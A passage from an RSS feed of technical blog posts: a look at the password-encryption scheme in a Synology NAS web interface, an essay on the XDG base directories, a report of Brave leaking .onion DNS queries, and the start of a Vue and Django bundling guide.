href="https://support.apple.com/guide/keychain-access/what-is-keychain-access-kyca1083/mac"><em>Keychain Access</em></a> on OSX or <a href="https://support.microsoft.com/en-us/windows/accessing-credential-manager-1b5c916a-6a16-889f-8581-fc16e8165ac0"><em>Credential Manager</em></a> on Windows 10). So, maybe my computer could take care of supplying encryption keys to the DiskStation!</p><p>I went looking for options, and discovered that the DiskStation Software has a <a href="https://global.download.synology.com/download/Document/Software/DeveloperGuide/Package/FileStation/All/enu/Synology_File_Station_API_Guide.pdf">publicly-documented web API (pdf)</a>. At least, a <em>mostly</em> publicly documented web API ‚Äì there‚Äôs no documentation for the methods to mount and unmount encrypted shares.</p><p>That web API is <em>also</em> used by the desktop software though! So it should theoretically be possible to use <a href="https://developer.mozilla.org/en-US/docs/Learn/Common_questions/What_are_browser_developer_tools">browser devtools</a> to see exactly <em>what</em> is being sent to the DiskStation. ü§î</p><p>So, I clicked on all the right things in the Web UI, got to the bit where you type in the password, opened the devtools to the ‚ÄúNetwork Requests‚Äù tab, typed in <code>abc123</code> as my password, hit ‚Äúsend‚Äù and then watched for the requests:</p><figure><img src="https://capnfabs.net/posts/wtf-encryption-scheme-synology-diskstation-nas/encryption-dot-cgi.png" alt="Firefox devtools screenshot, showing a request to an ominously-named 'encryption.cgi'"><figcaption><p>hmmmmmmmmmmm</p></figcaption></figure><p>Hmmm, that <code>encryption.cgi</code> looks a little ominous. I wonder what‚Äôs in it?</p><figure><img src="https://capnfabs.net/posts/wtf-encryption-scheme-synology-diskstation-nas/public-key.png" alt="Firefox devtools screenshot, showing huge blob of base16-encoded public-key"><figcaption><p>Yep, looks like encryption, alright</p></figcaption></figure><p>Ok, a public key. And then the web interface loads a spinner, and makes a request to <code>entry.cgi</code>. Let‚Äôs take a look at the contents of that request:</p><figure><img src="https://capnfabs.net/posts/wtf-encryption-scheme-synology-diskstation-nas/ciphertext.png" alt="A devtools screenshot, showing a jumbled blob of base64-encoded data with the phrases 'rsa' and 'aes' sprinkled throughout."><figcaption><p>HMMMMMMMMMMMMMMMM</p></figcaption></figure><p>Ok, so if we want to send a magic request to mount the encrypted share, it‚Äôs not going to be enough to supply the encryption password; we‚Äôre also going to need to figure out how to <em>correctly</em> supply it ‚Äì how to <em>encrypt</em> the encryption password, so to speak.</p><h2 id="so-what-is-this-crypto-system">So, what is this crypto system?</h2><p>Right. Here‚Äôs a high-level overview:</p><ul><li>First, we fetch the <code>public_key</code> from the server. That‚Äôs the call to the <code>encryption.cgi</code> endpoint we saw earlier. This isn‚Äôt actually the entire public key, it‚Äôs only <em>part</em> of it. In fact, this is a 4096-bit integer, encoded in base-16. The <em>other</em> part of the public key is the number <code>0x10001 == 65537</code>, which is hardcoded into the JavaScript.</li><li>Then, we generate 501 bytes worth of random text from the charset <code>0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ~!@#$%^&amp;*()_+-/</code> (that‚Äôs 77 different possible characters; I have no idea why this set was chosen though!).</li><li>We encrypt that random text using our public key. The encryption method is <a href="https://tools.ietf.org/html/rfc3447#section-7.2">RSA with PKCS1.5 padding</a>.</li><li>We MD5-hash that random text a bunch of times with an 8-byte salt. The end result of this is 48 bytes which certainly <em>look</em> pretty random to the naked eye.</li><li>We split those 48 bytes into two components ‚Äì a 32-byte (== 256-bit) key, and a 16-byte initialisation vector.</li><li>Remember the password we typed in? Yeah, I‚Äôd forgotten about it too! But now, we <em>finally</em> take that password, and encrypt it with AES in Cipher Block Chaining (CBC) mode with PKCSv7 padding, using the 256-bit key and 16-byte IV we derived in the previous step.</li><li>We bundle the RSA ciphertext, the 8-byte salt, and the AES ciphertext together and ship them across to the DiskStation.</li></ul><p>Still with me? It‚Äôs ok if that didn‚Äôt all make loads of sense yet; we‚Äôll now go over the interesting bits more closely.</p><h3 id="symmetric--asymmetric-ciphers">Symmetric / Asymmetric Ciphers</h3><p>Fundamentally, we‚Äôre using two cryptographic algorithms in concert:</p><ul><li><strong>RSA</strong>: RSA is an <em>asymmetric</em> cryptographic algorithm. Asymmetric cryptographic systems have two <em>keys</em> ‚Äì a public key, which allows only for encryption of the data, and a private key, which allows for both encryption <em>and</em> decryption.</li><li><strong>AES</strong>: AES is a <em>symmetric</em> cryptographic algorithm. In symmetric cryptography, all parties have the same key, and that key allows you to both encrypt and decrypt.</li></ul><p>It seems weird that we‚Äôre using both of these at the same time, right? But both systems have weaknesses, and mixing them together is an attempt at minimising the disadvantages of both schemes.</p><p>The problem with <em>symmetric</em> crypto systems by themselves is that you need a way to get that one key to every party that needs it. But you can‚Äôt just <em>send</em> it to them, because you don‚Äôt have a secure channel yet! Your options are:</p><ul><li>Share the key over a different trusted channel beforehand, or</li><li>have both parties derive the same shared key (from e.g. some partial data that they negotiate over the wire beforehand).</li></ul><p>Asymmetric crypto doesn‚Äôt have this problem ‚Äì if you‚Äôre able to share a key that can only be used for encrypting and not for decrypting, then the decryption keys never have to leave the recipient machine. You can then encrypt some text, and nobody except for the recipient can decrypt it ‚Äì not even you! Put it on the internet, write it on a banner attached to the back of a propeller plane ‚Äì the message will only be readable by the intended recipient.</p><figure><img src="https://capnfabs.net/posts/wtf-encryption-scheme-synology-diskstation-nas/your-ciphertext-here.jpg" alt="A propeller plane with a banner reading 'your ciphertext here'"></figure><p>Asymmetric cryptography is <em>slow</em>, though, so doing it for lots of data is going to really hurt performance.</p><p>A common solution is to simply <em>make up</em> a symmetric key, perform some symmetric encryption using that key, then encrypt <em>that</em> key using asymmetric cryptography, and deliver both to the remote party. Then, the remote party can:</p><ul><li>First, perform asymmetric decryption to obtain the symmetric key</li><li>Then, use that symmetric key to decrypt the rest.</li></ul><p>That‚Äôs what <em>this</em> particular system is doing. ‚ú®</p><h3 id="a-quick-note-about-rsa">A quick note about RSA</h3><p>I don‚Äôt know much about how RSA works, but as part of researching this article I discovered that it‚Äôs pretty easy to implement badly, and <a href="https://blog.trailofbits.com/2019/07/08/fuck-rsa/">extremely difficult to implement well</a>.</p><figure><img src="https://capnfabs.net/posts/wtf-encryption-scheme-synology-diskstation-nas/rsa-correct.gif" alt="Two developers correctly implement RSA, 2010, colorised"><figcaption><p><a href="https://www.youtube.com/watch?v=vPwzHm6buB8">Two developers correctly implement RSA</a>, 2010, colorised</p></figcaption></figure><p>As software developers, we spend a lot of time shipping things once they get to a point of ‚Äúit looks like it works‚Äù. <strong>You can‚Äôt take that approach with cryptography</strong>, and because everything is so opaque, it‚Äôs a lot easier to declare that your implementation works without realising that it‚Äôs missing fundamentals. Like correctness, for example.</p><h3 id="lets-talk-about-random-keyslets-talk-about-you-and-me">Let‚Äôs talk about random keys<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup></h3><p>Recall that this algorithm is generating 501 random bytes from a 77-character set, and encrypting that with RSA. 501 seemed like an oddly specific number to me; here‚Äôs the specific set of circumstances that characterise <em>why</em> we‚Äôre generating a string of this length.</p><p>RSA is a <a href="https://en.wikipedia.org/wiki/Block_cipher"><em>block cipher</em></a>, which means it operates on distinct fixed-size blocks of input and produces fixed-size blocks of output. How big can each block be? Well, RSA public keys are made up of two numbers: a (very large) modulus <code>n</code>, and a much smaller exponent <code>e</code>. RSA is capable of encrypting any message that‚Äôs smaller than <code>n</code> if you convert it to a number. In our case, we said that our modulus was a seemingly-random 4096-bit integer ‚Äì that means (approximately) that we can encrypt 512-byte blocks.</p><p>There‚Äôs an important implication here: if you don‚Äôt have enough input for a block, you need to fill it up somehow. Normally this is called a <em>padding scheme</em><sup id="fnref:3"><a href="#fn:3" role="doc-noteref">3</a></sup> in block-based cryptography.</p><p>Now, the system on this NAS in particular uses <a href="https://tools.ietf.org/html/rfc3447#section-7.2.1">PKCS1-v1.5 padding</a>, which prepends the message (before encryption) with 3 bytes of headers <em>plus</em> a minimum of 8 bytes<sup id="fnref:4"><a href="#fn:4" role="doc-noteref">4</a></sup> of random garbage. That makes 11 bytes out of a 512 byte block, which means we‚Äôve got‚Ä¶ 501 bytes left for our message. ‚ú®</p><h3 id="lo-fi-key-derivation">Lo-fi key derivation</h3><p>So‚Ä¶ we‚Äôve got this 501-byte string, with each character being one of 77 possibilities, and we think we know <em>why</em> it was chosen to be 501 bytes long. But that‚Äôs not going to work for AES-encrypting the password:</p><ul><li>AES requires a key size of 128, 192, or 256 bits. That‚Äôs 16, 24, or 32 bytes respectively, but we‚Äôve got <em>lots</em> more than that.</li><li>We can‚Äôt, however, just take a subset of bytes from the text and go from there ‚Äì because they‚Äôre selected from a narrow subset of possible bytes (77 out of 255!), you‚Äôd be losing an <em>enormous</em> amount of entropy in the key, making the encrypted text about 44,000,000,000,000,000 times<sup id="fnref:5"><a href="#fn:5" role="doc-noteref">5</a></sup> easier to break.</li></ul><p>These constraints need to be managed. We can smooth over both by applying a <a href="https://en.wikipedia.org/wiki/Key_derivation_function">key derivation function</a>, based on repeated rounds of MD5 hashing and concatenating. Hash algorithms, in general, are good for this because they map input data to‚Ä¶ not random, but random-<em>looking</em> output data.</p><p>I like to think of hashing as ‚Äúentropy laundering‚Äù ‚Äì if you‚Äôve got 256 bits of entropy in a 16kB file, taking the first 256 bits will give you only 64 bits of entropy. If you hash the whole 16kB file, then the entropy goes back up to the maximum of the entropy in the file and the entropy provided by the hash algorithm. This works because hash algorithms are designed to exhibit an <a href="https://en.wikipedia.org/wiki/Avalanche_effect">avalanche effect</a>.</p><p>I do <em>not</em> have the tools or experience to evaluate whether this specific scheme is secure or not (this one seems esoteric, and the <a href="https://security.stackexchange.com/questions/19906/is-md5-considered-insecure">use of MD5 is scary</a>!)‚Ä¶ so let‚Äôs move briskly on.</p><h3 id="aes-encryption">AES-encryption</h3><p>Finally, after a bunch of outdated and somewhat esoteric primitives, we‚Äôre back to something that is <em>good</em> and <em>works</em> and <em>only slightly</em> a <a href="https://en.wiktionary.org/wiki/footgun">loaded footgun</a> and is <em>still recommended for widespread use!</em> It‚Äôs AES with a 256-bit key.</p><p>AES is our symmetric cipher. Like RSA, it operates on blocks of fixed length. <a href="https://crypto.stackexchange.com/questions/66314/whats-the-best-block-cipher-mode-of-operation-for-rsa/66321#66321">Unlike RSA</a>, these blocks can be chained together. The strategies to do this are called <a href="https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation">‚ÄúBlock cipher modes of operation‚Äù</a>, and AES implementations ship with a number of them. The problem is, this means you have access ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://capnfabs.net/posts/wtf-encryption-scheme-synology-diskstation-nas/">https://capnfabs.net/posts/wtf-encryption-scheme-synology-diskstation-nas/</a></em></p>]]>
            </description>
            <link>https://capnfabs.net/posts/wtf-encryption-scheme-synology-diskstation-nas/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26194999</guid>
            <pubDate>Fri, 19 Feb 2021 16:50:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Dotfile Madness (2019)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26194878">thread link</a>) | @maple3142
<br/>
February 19, 2021 | https://0x46.net/thoughts/2019/02/01/dotfile-madness/ | <a href="https://web.archive.org/web/*/https://0x46.net/thoughts/2019/02/01/dotfile-madness/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <div>  <p>We are no longer in control of our home directories.</p> <p>My own home directory contains 25 ordinary files and 144 hidden files. The dotfiles contain data that doesn't belong to me: it belongs to the programmers whose programs decided to hijack the primary location designed as a storage for my personal files. I can't place those dotfiles anywhere else and they will appear again if I try to delete them. All I can do is sit here knowing that in the darkness, behind the scenes, they are there. Waiting in silence. Some of those programmers decided to additionally place some normal files and directories in the same place. Those are clearly visible every time I execute <code>ls</code> in my home directory. It is beyond me why my home directory ended up up containing a <code>node_modules</code> directory, <code>package-lock.json</code>, a <code>yarn.lock</code> file (I have never even consciously used yarn!), some 2 strange log files origination from some Java software clearly using an H2 database, and a <code>Desktop</code> directory. That last one has been created by Steam, which is quite unfortunate as I simply do not have a desktop or a desktop environment on my machine. I dread the day in which I will hear a loud knock on my door and one of those programmers will barge in informing me that he is going to store a piece of his furniture in the middle of my living room, If I don't mind.</p> <p>To those of you reading this: I beg you. Avoid creating files or directories of any kind in your user's <code>$HOME</code> directory in order to store your configuration or data. This practice is bizarre at best and it is time to end it. I am sorry to say that many (if not most) programs are guilty of doing this while there are significantly better places that can be used for storing per-user program data.</p> <p>Even if we will never be able to solve this problem - due to the historical baggage, backward compatibility, software no longer receiving updates or programming villains storing the files wherever they want just to see the world burn - we can at least try to follow some sane practices. While the <a href="https://plus.google.com/+RobPikeTheHuman/posts/R58WgWwN9jp">mistake of introducing the mere concept of a "hidden" file</a> can't be undone anymore, we can at least try to mitigate its results.</p> <p>This particular problem has been noticed and solved a long time ago with the creation of <a href="https://specifications.freedesktop.org/basedir-spec/basedir-spec-latest.html">XDG Base Directory Specification</a>. The specification defines a set of environment variables pointing programs to a directory in which their data or configuration should be stored. It is up to the user to set those variables so if the variables are not available the programs are expected to default to a directory defined by the standard and not the user's home directory.</p> <h2>User-level variables</h2> <h3><code>$XDG_DATA_HOME</code></h3> <blockquote> <p><code>$XDG_DATA_HOME</code> defines the base directory relative to which user specific data files should be stored. If <code>$XDG_DATA_HOME</code> is either not set or empty, a default equal to <code>$HOME/.local/share</code> should be used. </p> </blockquote> <p>Example usage: storing plugins downloaded by the user, databases created by your program, user's input history, bookmarks, emails, and so on.</p> <h3><code>$XDG_CONFIG_HOME</code></h3> <blockquote> <p><code>$XDG_CONFIG_HOME</code> defines the base directory relative to which user specific configuration files should be stored. If <code>$XDG_CONFIG_HOME</code> is either not set or empty, a default equal to <code>$HOME/.config</code> should be used. </p> </blockquote> <p>You should use this directory to store user-specific configuration files for your program. You will most likely want to create a default configuration file with sane and sensible default values the first time your program is executed.</p> <h3><code>$XDG_CACHE_HOME</code></h3> <blockquote> <p><code>$XDG_CACHE_HOME</code> defines the base directory relative to which user specific non-essential data files should be stored. If <code>$XDG_CACHE_HOME</code> is either not set or empty, a default equal to $HOME/.cache should be used.</p> </blockquote> <p>Example: caching thumbnails generated by your file manager, songs that the user of a music straming software is often listening to, and so on. Your program should continue to function without any problems if this directory is removed by the user. Ensure that the files that are no longer needed are properly removed. Remember that exceeding the sensible amount of storage space used by your files will most likely upset the user who will quickly track down your program as a culprit.</p> <h3><code>$XDG_RUNTIME_DIR</code></h3> <blockquote> <p><code>$XDG_RUNTIME_DIR</code> defines the base directory relative to which user-specific non-essential runtime files and other file objects (such as sockets, named pipes, ...) should be stored.</p> </blockquote> <p>The specification lists a series of requirements that have to be fulfilled by this directory. As described by the specification you should use this directory to store sockets and similar files used for communication.</p> <h2>System-level variables</h2> <h3><code>$XDG_CONFIG_DIRS</code></h3> <blockquote> <p><code>$XDG_CONFIG_DIRS</code> defines the preference-ordered set of base directories to search for configuration files in addition to the <code>$XDG_CONFIG_HOME</code> base directory. The directories in <code>$XDG_CONFIG_DIRS</code> should be seperated with a colon ':'.</p> <p>If <code>$XDG_CONFIG_DIRS</code> is either not set or empty, a value equal to <code>/etc/xdg</code> should be used. </p> </blockquote> <p>This directory should be used for storing system-wide configuration files that can be overwriten by user-specific configuration files. This directory would most likely be populated during the installation process.</p> <h3><code>$XDG_DATA_DIRS</code></h3> <blockquote> <p><code>$XDG_DATA_DIRS</code> defines the preference-ordered set of base directories to search for data files in addition to the <code>$XDG_DATA_HOME</code> base directory. The directories in <code>$XDG_DATA_DIRS</code> should be seperated with a colon ':'.</p> <p>If <code>$XDG_DATA_DIRS</code> is either not set or empty, a value equal to <code>/usr/local/share/:/usr/share/</code> should be used.</p> </blockquote> <p>Example: storing plugins or themes that can be used by all users of your program. This directory would most likely be populated during the installation process.</p> <h2>How does this work in practice?</h2> <p>Using the standard is very simple. Read the relevant environment variable and use the default paths defined by the standard if it is missing. You should then append a program-specific directory name to it and create the entire directory tree to store your data.</p> <p>As an example if you were to store configuration files you should use <code>$XDG_CONFIG_HOME/your-program</code> as your base configuraion directory instead of just storing your files directly in <code>$XDG_CONFIG_HOME</code>. Remember to never hardcode the directories to the default values defined by the standard. Read the environment variable first to allow the user to move those directories if needed.</p> <p>You can easily migrate your existing programs to use this standard. In order to do so start using the standard when creating new files but keep also checking the old location of the files when reading them. This will allow you to migrate without breaking the program for the users with the configuration or data files that were created by a previous version of your program.</p> <p>Read the standard to find out more and have a look at the directory hierarchy which is almost certain to be already present in your home directory. In reality a cross-platform library allowing you to get a directory for storing your data will be available for your programming language of choice. On Linux and similar systems, this library will surely use the XDG Base Directory Specification.</p> <p> 2019-02-01 </p> </div> </div></div>]]>
            </description>
            <link>https://0x46.net/thoughts/2019/02/01/dotfile-madness/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26194878</guid>
            <pubDate>Fri, 19 Feb 2021 16:37:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Brave Browser leaks your Tor / Onion service requests through DNS]]>
            </title>
            <description>
<![CDATA[
Score 341 | Comments 84 (<a href="https://news.ycombinator.com/item?id=26194764">thread link</a>) | @todsacerdoti
<br/>
February 19, 2021 | https://ramble.pw/f/privacy/2387/brave-browser-leaks-your-tor-onion-service-requests-through | <a href="https://web.archive.org/web/*/https://ramble.pw/f/privacy/2387/brave-browser-leaks-your-tor-onion-service-requests-through">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
              <div lang="en" dir="ltr"><p>Edit: (Since this is gaining traction elsewhere.) I'm not trying to shit on Brave. I'm just wanting to help protect end-users who may use Brave for it's Tor feature to do stuff over Tor that should only be done with the actual Tor browser. If you're using Brave you probably use it because you expect a certain level of privacy/anonymity. Piping .onion requests through DNS where your ISP or DNS provider can see that <em>you</em> made a request for an .onion site defeats that purpose.</p>
<p>I'm also no NetSec expert but you don't have to be to replicate this. I'm just a dude with some websites and projects and I'm not certain I would have taken notice of this if it wasn't reported to me by a partner on another project who witnessed this behavior when monitoring his local requests leaving his network. He'll be doing his own write-up and is more equipped to discuss this in length than me.</p>
<hr><p>Testing out something that was noted a week or so ago, and wanting to replicate it for the purpose of this post.</p>
<p>Some of you know I'm working on an ad, tracker, and other BS blocking VPN service for an unrelated project to this site. Go to <a href="https://ramble.pw/f/incoghost">/f/incoghost</a> (<a href="https://incog.host/" rel="nofollow">website</a>) for more because I try to keep these things separated.</p>
<p>Anyhow, it was reported by a partner that Brave was leaking DNS requests for onion sites and I was able to confirm it at the time. Decided to spin up a VM with Brave and test with this site's Onion service (though it will do this for any .onion)</p>
<p>Example:</p>
<pre><code> Feb 18 12:02:25: query[A] rambleeeqrhty6s5jgefdfdtc6tfgg4jj6svr4jpgk4wjtg3qshwbaad.onion from 104.244.xx.xxx
</code></pre>
<p>What this entry shows (simply) is that the request made for the domain rambleeeqrhty6s5jgefdfdtc6tfgg4jj6svr4jpgk4wjtg3qshwbaad.onion made it to the DNS server and is tagged with the IP of the requester, which in this case is just the test / dev VPN. This shouldn't happen. There isn't any reason for Brave to attempt to resolve a .onion domain through traditional means as it would with a regular clearnet site.</p>
<p>This is especially worrisome for those of you who use Brave browser from your normal residential IP and (for whatever reason) use the Tor feature built into the browser to access Tor sites. Your ISP or DNS provider <em>will</em> know that a request made to a specific Tor site was made by <em>your</em> IP. With Brave, your ISP would know that you accessed <em>somesketchyonionsite.onion</em> .</p>
<p>TL;DR: If you're going to use Tor, use the Tor Browser and not Brave. The Tor browser itself doesn't leak these requests like Brave does.</p>
<hr><p>Edit: To clarify, the VPN service we're working on is no-logging but during this dev and testing period we're logging DNS requests while we work out the kinks in the blocklists. This has also allowed us to witness .onions being passed through which is a fault of Brave.</p>
<hr><p>Edit 2: Screenshot: <a href="https://images2.imgbox.com/98/46/1i084PbC_o.png" rel="nofollow">https://images2.imgbox.com/98/46/1i084PbC_o.png</a></p>
<p>That was me loading duckduckgo in a different container, with brave, while live fetching DNS requests made to the DNS server. I blurred out the non-onion requests. (Different VPN test location than in the above example so 209.x.x.x IP instead of the 104.x.x.x one in the original example.</p>
<hr><h3>EDIT 2: The mods of /r/privacy won't let this be posted. They say:</h3>
<blockquote>
<p>While we (vastly) prefer the Tor Browser over the Brave one, you'll need a better source than the one you found. Can you find something from a more widely recognized NetSec expert? Something along the lines of Bruce Schneier's blog or something at that level of credibility?</p>
</blockquote>
<p>and</p>
<blockquote>
<p>The problem with screenshots is that they can be faked, trivially. There are also a host of approaches that credible writers/reporters do in the NetSec space do before a line of text appears in print. It's this kind of journalism that we have to trust, since we humble Mods don't have the time or resources to vet. So, we'll need something better sourced. Sorry!</p>
</blockquote>
<p>and</p>
<blockquote>
<p>There are new posts everyday "warning" people of things that aren't legitimate, hence the caution. This is not a "security" subreddit. A moderator's job is to ensure that the subreddit doesn't devolve into conspiracy theories and misinformation. Security announcements should be vetted and confirmed, not independent claims that the mods have no time to independently verify.</p>
<blockquote>
<p>I can post the steps on how to easily replicate this by using pi-hole on their local networks. Anyone is capable of verifying this.</p>
</blockquote>
<p>Great. Please do so on r/brave, r/netsec, r/infosec, and other places where this is both directly relevant and appropriate to seek others confirmation. Once vetted by the community (and republished by professionals), you're welcome to post those official responses.</p>
</blockquote>
<p>/r/brave is private, invite only. I posted on netsec and infosec so we'll see. I guess /r/privacy must love Brave and not allow anything against it since it's so god damned easy to verify this...</p>
<p>All you have to do to VERIFY that this is happening is A.) Use Brave B.) Go to an Onion site C.) Observe DNS traffic. Install Pi-Hole on a Raspberry Pi or in a Virtual Machine on your desktop and run your DNS requests through it for ease of use and you can verify it. Not sure why they're so hesitant to inform their subscribers of this.</p>
<hr><p>Edit 3: Tested on both a Debian 10 and Ubuntu desktop. I'm not esteemed NetSec researcher and I'm not setting up a 100 different scenarios.</p>
</div>
            </div></div>]]>
            </description>
            <link>https://ramble.pw/f/privacy/2387/brave-browser-leaks-your-tor-onion-service-requests-through</link>
            <guid isPermaLink="false">hacker-news-small-sites-26194764</guid>
            <pubDate>Fri, 19 Feb 2021 16:27:04 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building Web Apps with Vue and Django ‚Äì The Ultimate Guide]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26194584">thread link</a>) | @davidfstr
<br/>
February 19, 2021 | https://dafoster.net/articles/2021/02/16/building-web-apps-with-vue-and-django-the-ultimate-guide/ | <a href="https://web.archive.org/web/*/https://dafoster.net/articles/2021/02/16/building-web-apps-with-vue-and-django-the-ultimate-guide/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
    
    
    




<p><a href="https://vuejs.org/v2/guide/">Vue</a> and <a href="https://www.djangoproject.com/">Django</a> are both fantastic for building modern web apps - bringing declarative functional reactive programming to the frontend, and an integrated web app platform, ecosystem, and battle-hardened ORM to the backend. However they can be somewhat tricky to use <em>together</em>.</p>

<p>Here I‚Äôd like to show some approaches for setting Vue and Django up in combination for both new web apps and existing Django-based web apps. I‚Äôve been building web apps with Django for ~6 years and with Vue for ~3 years, and in particular I‚Äôve extensively tested the <a href="#1-server-approach">1‚Äëserver</a>&nbsp;<a href="#concatenated-bundling">concatenated bundling</a> approach described below in production.<br clear="both"></p>





<p>The first question to consider when planning to use Django and Vue together is whether to use a single server that serves both backend endpoints and frontend assets, or to use two different servers, one to host the frontend and a separate ‚ÄúAPI server‚Äù to host the backend.</p>

<p><a href="https://dafoster.net/assets/2021/vue-and-django/1-server-vs-2-server.svg">
    <img alt="Diagram: 1-server vs 2-server setup" src="https://dafoster.net/assets/2021/vue-and-django/1-server-vs-2-server.svg">
</a></p>

<p>Factors in favor of a 1-server setup:</p>

<ul>
<li><strong>Operational maintenance costs</strong> are significantly simplified with only a single server to deploy, monitor, and manage.</li>
<li>Relegating Django‚Äôs role to only that of an API server - in the 2-server setup - will complicate or even prevent you from using any <strong>Django features or third-party apps that rely on server-side rendering by Django</strong>, such as its famous built-in administration interface. Instead you‚Äôll be doing most of your server-side rendering with some JavaScript framework that is Node-compatible. And Node-based server-side rendering is generally rather complex to setup.</li>
</ul>


<p>Factors in favor of a 2-server setup:</p>

<ul>
<li>If you want to use the latest and greatest version of JavaScript, with transpilation and module bundling, the 2-server setup has <strong>great community documentation for setting up a frontend server and build pipeline that supports all of these new JavaScript features</strong>.

<ul>
<li>However most of those features can <em>still</em> be obtained in a single-server setup with some effort, as described later in this article.</li>
</ul>
</li>
<li>If your organization already has <strong>separate frontend and backend teams</strong>, it may be easier to have 2 servers - one managed by the frontend team, and one managed by the backend team - to allow each team to focus on each server separately (and satisfy Conway‚Äôs Law <sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup> üôÇ).</li>
<li>If your organization already has a <strong>separate operations team</strong> that has the capacity to manage the additional server implied by a 2-server setup, then the additional operational overhead may be acceptable.</li>
</ul>


<p>At my company we went with the single server option because our engineering team is small (&lt; 5 engineers) - so we care a lot about minimizing operational overhead - and is composed of full-stack generalists who are familar with both backend and frontend technologies - so we have engineers that can work anywhere in the stack but aggressively prefer <em>simple</em> architechures that don‚Äôt require extreme specialization in multiple domains.</p>

<p>In the next section I‚Äôll drill down into the 1-server approach, but you can also skip to the <a href="#2-server-approach">2-server approach</a> if that‚Äôs what you‚Äôre leaning toward.</p>





<p>When using a single server, you‚Äôll need to:</p>

<ul>
<li>pick an asset <a href="#bundling-strategy">bundling strategy</a>,</li>
<li><a href="#render-baseline-html-with-django">render SEO-friendly HTML server-side</a> with critical navigation and content available immediately on page load, and</li>
<li><a href="#enhance-baseline-html-with-vue">enhance that HTML client-side with Vue after page load</a> with additional dynamic content.</li>
</ul>




<h2>Bundling strategies</h2>

<p>When using a single integrated Django server to not only host your backend but also serve your frontend, you‚Äôll need to decide how you want to bundle your JavaScript assets on the frontend together. <strong>Bundling of some kind is necessary for a production deployment</strong> that is fast enough to be mobile-friendly and usable by distant international customers who may not have fast network connectivity to your server.</p>

<p>There are multiple bundling techniques that can be used with Django, with various pros and cons:</p>

<ul>
<li><a href="#concatenated-bundling">Concatenated Bundling</a>,</li>
<li><a href="#import-traced-bundling">Import-Traced Bundling</a>, and</li>
<li><a href="#transpiled-bundling">Transpiled Bundling</a>.</li>
</ul>




<h3>Concatenated Bundling</h3>

<p><a href="https://dafoster.net/assets/2021/vue-and-django/bundling-strategies/concatenated.svg">
    <img alt="Diagram: Concatenated Bundling Strategy" src="https://dafoster.net/assets/2021/vue-and-django/bundling-strategies/concatenated.svg">
</a></p>

<p>This is by far the easiest bundling technique to use with Django and is a good technique to start with.</p>

<p>With concatenated bundling, you write JavaScript files that consist entirely of top-level function definitions and other non-executable code. Your HTML template served by Django contains <code>&lt;script&gt;</code>-includes of every JavaScript file that the current page requires, directly or transitively. And after all JavaScript files are included the HTML page uses an inline <code>&lt;script&gt;</code> to call the root JavaScript function which sets up the rest of the page:<br clear="both"></p>

<pre><code>&lt;!-- todo/templates/todo/todo.html --&gt;
&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;...&lt;/head&gt;
&lt;body&gt;...&lt;/body&gt;
{% compress js %}
    &lt;script src="{% static 'todo/todo.js' %}"&gt;&lt;/script&gt;
    &lt;script src="{% static 'todo/todo/list.js' %}"&gt;&lt;/script&gt;
    &lt;script src="{% static 'todo/todo/item.js' %}"&gt;&lt;/script&gt;
    &lt;script&gt;
        setupTodoPage();
    &lt;/script&gt;
{% endcompress %}
&lt;/html&gt;
</code></pre>


<blockquote><p>Note: The <code>{% compress js %}</code> tag above assumes that you are using the excellent <a href="https://django-compressor.readthedocs.io/en/stable/">Django Compressor</a> library which integrates well with Django as your concatenating bundler.</p></blockquote>

<p>Pros of concatenated bundling:</p>

<ul>
<li><strong>Very easy to setup.</strong> Leverages excellent documentation from the Django Compressor library.</li>
<li><strong>Zero bundle build times during development.</strong></li>
<li>Fastest bundle build times during deployment, compared with other approaches.<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup></li>
</ul>


<p>Cons of concatenated bundling:</p>

<ul>
<li>You must manage your JS dependencies in HTML manually:

<ul>
<li>Whenever adding a new JS module you must remember to add it to the HTML for the appropriate page(s).</li>
<li>If you alter an existing JS module to depend on a new JS module, you must find all page HTMLs that include the first module and update them to include the second module if needed.</li>
<li>If you want to avoid managing JS dependencies manually, consider <a href="#import-traced-bundling">import-traced bundling</a> instead.</li>
</ul>
</li>
<li>JavaScript files are not transformed or transpiled in any way, so if you want to use newer JavaScript features that aren‚Äôt supported by your customers' browsers then you‚Äôre out of luck. If you need transpilation consider the <a href="#transpiled-bundling">transpiled</a> or the <a href="#2-server-approach">2-server</a> approaches instead.</li>
<li>It is awkward to define a class in a JavaScript module that inherits from a base class in a different module, because that <em>requires</em> <code>&lt;script&gt;</code>-including the base class‚Äôs module first, breaking the usual rule that ‚Äúthe order that JS files are imported should not matter‚Äù. (However if you just limit inheritance to be within a single module or avoid it entirely, then this restriction doesn‚Äôt matter in practice.)</li>
</ul>


<p>Note that choosing concatenated bundling does <em>not</em> prevent you from using TypeScript-based type checking in your JS files, which I <em>do</em> recommend for long-lived projects. In short, you can put a special <code>// @ts-check</code> comment at the top of a JS file to <a href="https://www.typescriptlang.org/docs/handbook/intro-to-js-ts.html">enable type-checking of JS with the TypeScript compiler</a> (<code>tsc</code>). <!-- Using TypeScript to type-check JS files doesn't seem like a very-well known technique, so I plan to write a future article about it. --></p>



<h3>Import-Traced Bundling</h3>

<p><a href="https://dafoster.net/assets/2021/vue-and-django/bundling-strategies/import-traced.svg">
    <img alt="Diagram: Import-Traced Bundling Strategy" src="https://dafoster.net/assets/2021/vue-and-django/bundling-strategies/import-traced.svg">
</a></p>

